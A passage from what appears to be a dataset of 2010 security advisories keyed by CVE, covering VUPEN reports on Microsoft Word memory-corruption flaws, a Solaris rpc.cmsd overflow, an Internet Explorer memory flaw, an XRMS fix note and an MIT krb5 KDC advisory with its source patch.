* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2626
http://www.microsoft.com/technet/security/bulletin/ms10-079.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3219
X. DISCLOSURE TIMELINE
-----------------------------
2010-05-05 - Vendor notified
2010-05-05 - Vendor response
2010-08-09 - Status update received
2010-10-12 - Coordinated public Disclosure"
14127,VUPEN Security Research - Microsoft Office Word Document Heap Overflow Vulnerability (CVE-2010-3218),,CVE-2010-3218,"VUPEN Security Research - Microsoft Office Word Document Heap Overflow Vulnerability (CVE-2010-3218)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Word, included in the Microsoft Office suite,
is a powerful authoring program that gives the ability to create
and share documents by combining a comprehensive set of writing
tools with the easy-to-use Microsoft Office Fluent user interface.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Word.
The vulnerability is caused by a heap overflow error when processing
certain data in a Word document, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening
a specially crafted Word file.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office XP Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-079 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2626
http://www.microsoft.com/technet/security/bulletin/ms10-079.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3218
X. DISCLOSURE TIMELINE
-----------------------------
2010-05-05 - Vendor notified
2010-05-05 - Vendor response
2010-08-09 - Status update received
2010-10-12 - Coordinated public Disclosure"
14128,VUPEN Security Research - Microsoft Office Word Document Invalid Pointer Vulnerability (CVE-2010-3217),,CVE-2010-3217,"VUPEN Security Research - Microsoft Office Word Document Invalid Pointer Vulnerability (CVE-2010-3217)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Word, included in the Microsoft Office suite,
is a powerful authoring program that gives the ability to create
and share documents by combining a comprehensive set of writing
tools with the easy-to-use Microsoft Office Fluent user interface.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Word.
The vulnerability is caused by the use of an invalid pointer when processing
certain structures in a Word document, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening
a specially crafted Word file.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2002 Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-079 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2626
http://www.microsoft.com/technet/security/bulletin/ms10-079.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3217
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-08 - Vendor notified
2010-04-08 - Vendor response
2010-08-09 - Status update received
2010-10-12 - Coordinated public Disclosure"
14129,VUPEN Security Research - Microsoft Office Word Bookmarks Invalid Pointer Vulnerability (CVE-2010-3216),,CVE-2010-3216,"VUPEN Security Research - Microsoft Office Word Bookmarks Invalid Pointer Vulnerability (CVE-2010-3216)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Word, included in the Microsoft Office suite,
is a powerful authoring program that gives the ability to create
and share documents by combining a comprehensive set of writing
tools with the easy-to-use Microsoft Office Fluent user interface.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Word.
The vulnerability is caused by the use of an invalid pointer when processing
bookmarks in a Word document, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening
a specially crafted Word file.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2004 for Mac
Microsoft Office 2002 Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-079 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2626
http://www.microsoft.com/technet/security/bulletin/ms10-079.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3216
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-08 - Vendor notified
2010-04-08 - Vendor response
2010-08-09 - Status update received
2010-10-12 - Coordinated public Disclosure"
14131,VUPEN Security Research - Microsoft Office Word Return Value Handling Vulnerability (CVE-2010-3215),,CVE-2010-3215,"VUPEN Security Research - Microsoft Office Word Return Value Handling Vulnerability (CVE-2010-3215)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Word, included in the Microsoft Office suite,
is a powerful authoring program that gives the ability to create
and share documents by combining a comprehensive set of writing
tools with the easy-to-use Microsoft Office Fluent user interface.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Word.
The vulnerability is caused by an error when handling return values while
parsing certain data in a Word document, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening a
specially crafted Word file.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2004 for Mac
Microsoft Office 2002 Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-079 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2626
http://www.microsoft.com/technet/security/bulletin/ms10-079.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3215
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-08 - Vendor notified
2010-04-08 - Vendor response
2010-08-09 - Status update received
2010-10-12 - Coordinated public Disclosure"
14133,VUPEN Security Research - Microsoft Office Word Document Stack Overflow Vulnerability (CVE-2010-3214),,CVE-2010-3214,"VUPEN Security Research - Microsoft Office Word Document Stack Overflow Vulnerability (CVE-2010-3214)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Word, included in the Microsoft Office suite,
is a powerful authoring program that gives the ability to create
and share documents by combining a comprehensive set of writing
tools with the easy-to-use Microsoft Office Fluent user interface.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Word.
The vulnerability is caused by a stack overflow error when processing
certain structures in a Word document, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening a
specially crafted Word file.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2010
Microsoft Office 2007 Service Pack 2
Microsoft Office 2003 Service Pack 3
Microsoft Office 2002 Service Pack 3
Microsoft Office 2008 for Mac
Microsoft Office 2004 for Mac
Microsoft Office Web Apps
Microsoft Office Compatibility Pack for Word, Excel, and PowerPoint 2007 File Formats Service Pack 2
Open XML File Format Converter for Mac
Microsoft Word Viewer
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-079 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2626
http://www.microsoft.com/technet/security/bulletin/ms10-079.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3214
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-08 - Vendor and TPP customers notified
2010-04-08 - Vendor response
2010-08-09 - Status update received
2010-10-12 - Coordinated public Disclosure"
14134,VUPEN Security Research - Microsoft Office Word Document Array Indexing Vulnerability (CVE-2010-2750),,CVE-2010-2750,"VUPEN Security Research - Microsoft Office Word Document Array Indexing Vulnerability (CVE-2010-2750)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Word, included in the Microsoft Office suite,
is a powerful authoring program that gives the ability to create
and share documents by combining a comprehensive set of writing
tools with the easy-to-use Microsoft Office Fluent user interface.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Word.
The vulnerability is caused by an array indexing error when processing
certain values in a Word document, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening a
specially crafted Word file.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2004 for Mac
Microsoft Office XP Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-079 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2626
http://www.microsoft.com/technet/security/bulletin/ms10-079.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2750
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-08 - Vendor and TPP customers notified
2010-04-08 - Vendor response
2010-08-09 - Status update received
2010-10-12 - Coordinated public Disclosure"
14135,VUPEN Security Research - Microsoft Office Word Document Buffer Overflow Vulnerability (CVE-2010-2748),,CVE-2010-2748,"VUPEN Security Research - Microsoft Office Word Document Buffer Overflow Vulnerability (CVE-2010-2748)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Word, included in the Microsoft Office suite,
is a powerful authoring program that gives the ability to create
and share documents by combining a comprehensive set of writing
tools with the easy-to-use Microsoft Office Fluent user interface.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Word.
The vulnerability is caused by a buffer overflow error when processing
certain data within a Word document, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening a
specially crafted Word file.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2004 for Mac
Microsoft Office XP Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-079 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2626
http://www.microsoft.com/technet/security/bulletin/ms10-079.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2748
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-08 - Vendor and TPP customers notified
2010-04-08 - Vendor response
2010-08-09 - Status update received
2010-10-12 - Coordinated public Disclosure"
14136,VUPEN Security Research - Microsoft Office Word Uninitialized Pointer Vulnerability (CVE-2010-2747),,CVE-2010-2747,"VUPEN Security Research - Microsoft Office Word Uninitialized Pointer Vulnerability (CVE-2010-2747)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Word, included in the Microsoft Office suite,
is a powerful authoring program that gives the ability to create
and share documents by combining a comprehensive set of writing
tools with the easy-to-use Microsoft Office Fluent user interface.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Word.
The vulnerability is caused by an uninitialized pointer when processing
certain data within a Word document, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening a
specially crafted Word file.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2004 for Mac
Microsoft Office XP Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-079 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2626
http://www.microsoft.com/technet/security/bulletin/ms10-079.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2747
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-08 - Vendor and TPP customers notified
2010-04-08 - Vendor response
2010-08-09 - Status update received
2010-10-12 - Coordinated public Disclosure"
14155,DDIVRT-2009-28 Sun Solaris 10 rpc.cmsd Buffer Overflow and Denial of Service (CVE-2010-3509),,CVE-2010-3509,"Title
-----
DDIVRT-2009-28 Sun Solaris 10 rpc.cmsd Buffer Overflow and Denial of Service (CVE-2010-3509)
Severity
--------
High
Date Discovered
---------------
November 3, 2009
Discovered By
-------------
Digital Defense, Inc. Vulnerability Research Team
Credit: Alex Kaszczuk, Alan Chin, Jose R. Hernandez and r@b13$
Vulnerability Description
-------------------------
The rpc.cmsd service contains an integer overflow which can allow a malicious unauthenticated user to cause a denial of service, or remotely execute arbitrary code with root privileges.
Solution Description
--------------------
Sun has addressed this vulnerability in Sun bugID 6214701. The patch is available for download through the Oracle October Critical Patch Update (CPU) released on 12 October, 2010.
Tested Systems / Software (with versions)
------------------------------------------
Sun Solaris 10 (10/09 Download)
Vendor Contact
--------------
Vendor Name: Sun Microsystems
Vendor Website: http://www.sun.com/"
14161,Internet Explorer Uninitialized Memory Corruption Vulnerability - CVE-2010-3331,,CVE-2010-3331,"Dear List,
I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Internet Explorer Uninitialized Memory Corruption Vulnerability
CVE-2010-3331 - MS10-071
INTRODUCTION
There exists a vulnerability within the way internet explorer handles specific objects that has not been correctly initialized or
has been deleted, which leads to uninitialized memory reference and code execution.
This vulnerability can be triggered thru different vectors, been Microsoft Word one of the tested ones.
This problem was confirmed in the following versions of Internet Explorer and Windows, other versions
maybe also affected.
Internet Explorer 6 running in All Versions of Windows
Internet Explorer 7 running in All Versions of Windows
Internet Explorer 8 running in All Versions of Windows
MICROSOFT EXPLOTABILITY INDEX
In order to help the Microsoft Response Team we did further analysis on the vulnerability and we classify it as: 1 consistent exploit code likely.
Important to note again that since the faulty code also appears inside the mshtml.dll other applications may behave differently when triggering the problem (even more when
talking about 3rd parties).
CVSS Scoring System
The CVSS score is: 8.3
Base Score: 10
Temporal Score: 8.3
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:F/RL:OF/RC:C
TRIGGERING THE PROBLEM
This vulnerability can be triggered by creating a persistent object with class id:
CLSID:AE24FDAE-03C6-11D1-8B76-0080C744F389.
The problem is triggered by the an exploit code available to interested party which causes invalid memory access in
all the referred versions.
CREDITS
This vulnerability was discovered and researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
14180,"Re: Multiple Cross Site Scripting (XSS) and SQL injection Vulnerabilities in XRMS, CVE-2008-3664",,CVE-2008-3664,"Both the XSS and SQL injection vulnerabilities have now been addressed in the XRMS code currently residing in CVS. A general filtering mechanism has been implemented to sanitize all GET, POST, COOKIE, REQUEST and SERVER data."
14198,MITKRB5-SA-2010-006 [CVE-2010-1322] KDC uninitialized pointer crash in authorization data handling,,CVE-2010-1322,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2010-006
MIT krb5 Security Advisory 2010-006
Original release: 2010-10-05
Topic: KDC uninitialized pointer crash in authorization data handling
CVE-2010-1322
CVSSv2 Vector: AV:N/AC:L/Au:S/C:P/I:P/A:C/E:H/RL:OF/RC:C
CVSSv2 Base Score: 8
Access Vector: Network
Access Complexity: Low
Authentication: Single
Confidentiality Impact: Partial
Integrity Impact: Partial
Availability Impact: Complete
CVSSv2 Temporal Score: 7
Exploitability: High
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
When the MIT krb5 KDC receives certain Kerberos TGS request messages,
it may dereference an uninitialized pointer while processing
authorization data, causing a crash, or in rare cases, unauthorized
information disclosure, ticket modification, or execution of arbitrary
code. The crash may be triggered by legitimate requests.
This is an implementation vulnerability in MIT krb5, and not a
vulnerability in the Kerberos protocol.
IMPACT
======
An authenticated remote attacker can cause the MIT krb5 KDC process to
crash, resulting in a denial of service. In rare cases, the attacker
can theoretically induce unauthorized information disclosure, ticket
modification, or the execution of arbitrary code.
The denial of service may be triggered by legitimate requests produced
by Windows Active Directory clients. No exploit code is known to
exist that would cause information disclosure, ticket modification, or
arbitrary code execution.
AFFECTED SOFTWARE
=================
* KDC in MIT krb5-1.8 through krb5-1.8.3
* Earlier releases of MIT krb5 did not contain the vulnerable code.
FIXES
=====
* The upcoming krb5-1.8.4 release will contain a fix for this
vulnerability.
* Apply the following patch. The patch was generated against
krb5-1.8.3.
diff --git a/src/kdc/kdc_authdata.c b/src/kdc/kdc_authdata.c
index b5de64d..cc44e29 100644
- --- a/src/kdc/kdc_authdata.c
+++ b/src/kdc/kdc_authdata.c
@@ -495,7 +495,7 @@ merge_authdata (krb5_context context,
krb5_boolean copy,
krb5_boolean ignore_kdc_issued)
{
- - size_t i, nadata = 0;
+ size_t i, j, nadata = 0;
krb5_authdata **authdata = *out_authdata;
if (in_authdata == NULL || in_authdata[0] == NULL)
@@ -529,16 +529,16 @@ merge_authdata (krb5_context context,
in_authdata = tmp;
}
- - for (i = 0; in_authdata[i] != NULL; i++) {
+ for (i = 0, j = 0; in_authdata[i] != NULL; i++) {
if (ignore_kdc_issued &&
is_kdc_issued_authdatum(context, in_authdata[i], 0)) {
free(in_authdata[i]->contents);
free(in_authdata[i]);
} else
- - authdata[nadata + i] = in_authdata[i];
+ authdata[nadata + j++] = in_authdata[i];
}
- - authdata[nadata + i] = NULL;
+ authdata[nadata + j] = NULL;
free(in_authdata);
This patch is also available at
http://web.mit.edu/kerberos/advisories/2010-006-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2010-006-patch.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2010-006.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2010-1322
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1322
ACKNOWLEDGMENTS
===============
Thanks to Mike Roszkowski for reporting this vulnerability, providing
a patch, and helping with analysis. Thanks to Pavel Jindra and
Radoslav Bodo for additional testing.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/8B8DF501 2010-01-15 [expires: 2011-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
In the function merge_authdata() in kdc_authdata.c, a loop that
attempts to exclude KDC-issued authorization data items when merging
two authorization data lists will advance the destination index
inappropriately when filtering out such an item. As a result, that
entry in the destination list will be an uninitialized pointer.
Subsequent operations on the resulting authorization data list can
dereference that uninitialized pointer, typically causing a crash. It
is theoretically possible that an attacker could manipulate the
contents of the heap so that the uninitialized pointer points to a
valid address, allowing unauthorized information disclosure,
manipulation of the authorization data in the resulting ticket, or a
subsequent free of that pointer. It is theoretically possible that an
attacker inducing the freeing of a chosen pointer could corrupt the
heap and execute arbitrary code.
Windows Active Directory clients can produce TGS requests that trigger
this vulnerability fairly consistently.
REVISION HISTORY
================
2010-10-05 original release
Copyright (C) 2010 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAkyrdcEACgkQSO8fWy4vZo5QVQCfbvzBA0Mx+CLktnrWgyphhQaZ
